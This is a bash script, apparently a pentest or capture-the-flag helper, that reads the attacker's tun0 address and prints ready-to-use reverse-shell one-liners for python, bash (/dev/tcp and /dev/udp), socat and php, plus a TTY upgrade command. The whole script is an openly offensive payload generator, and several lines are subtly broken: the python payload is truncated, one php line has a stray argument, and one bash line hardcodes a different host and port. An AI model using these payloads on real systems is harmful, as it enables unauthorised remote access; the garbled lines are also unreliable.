#!/bin/bash


IFACE="tun0"
LHOST=$( ip a s $IFACE | awk '/inet.*/ {print $2}' | head -n 1 | awk -F'/' '{print $1}' )
LPORT=443
SHELL="sh"

green="\e[0;92m"
blue="\e[0;94m"



# Checking for optional arguments

if [ $2 ]
then
        IFACE=$2
        LHOST=$( ip a s $IFACE | awk '/inet.*/ {print $2}' | head -n 1 | awk -F'/' '{print $1}' )
fi

if [ $3 ]
then
        LPORT=$3
fi

if [ $4 ]
then
        SHELL=$4
fi

if [ $1 == "python" ]
then
        echo -e "\n\n${blue}Reverse TCP:\n\n"
        echo -e "\t${green}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(($LHOST,$LPORT))"
        echo -e "\n\n${blue}TTY Shell Upgrade: \n\n"
        echo -e "\t${green}python -c 'import pty; pty.spawn("/bin/bash")'"
elif [ $1 == "bash" ]
then
        echo -e "\n${blue}Reverse TCP:\n\n"
        echo -e "\t${green}$SHELL -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
        echo -e "\t$0<&196;exec 196<>/dev/tcp/$LHOST/$LPORT; $SHELL <&196 >&196 2>&196"
        echo -e "\t$SHELL -l > /dev/tcp/10.0.0.1/4242 0<&1 2>&1"
        echo -e "\n\n${blue}Reverse UDP:\n\n"
        echo -e "\t${green}$SHELL -i >& /dev/udp/$LHOST/$LPORT 0>&1"
elif [ $1 == "pty" ]
then
        echo -e "\n\n${blue}TTY Shell Upgrade: \n\n"
        echo -e "\t${green}python -c 'import pty; pty.spawn("/bin/bash")'"
elif [ $1 == "socat" ]
then
        echo -e "\n\n${blue}Listener:\n\n"
        echo -e "\t${green}socat file:`tty`,raw,echo=0 tcp-listen:$LPORT"
        echo -e "\n\n${blue}Victim:\n\n"
        echo -e "\t${green}socat exec:'$SHELL',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT"

elif [ $1 == "php" ]
then
        echo -e "\n\n${blue}Reverse TCP:\n\n"
        echo -e "\t${green}php -r '$sock=fsockopen($LHOST,$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT);\`/bin/sh -i <&3 >&3 2>&3\`;'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT),4242);system(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT);passthru(\"/bin/sh -i <&3 >&3 2>&3\");'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
        echo -e "\tphp -r '$sock=fsockopen($LHOST,$LPORT);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
fi

echo -e "\n"
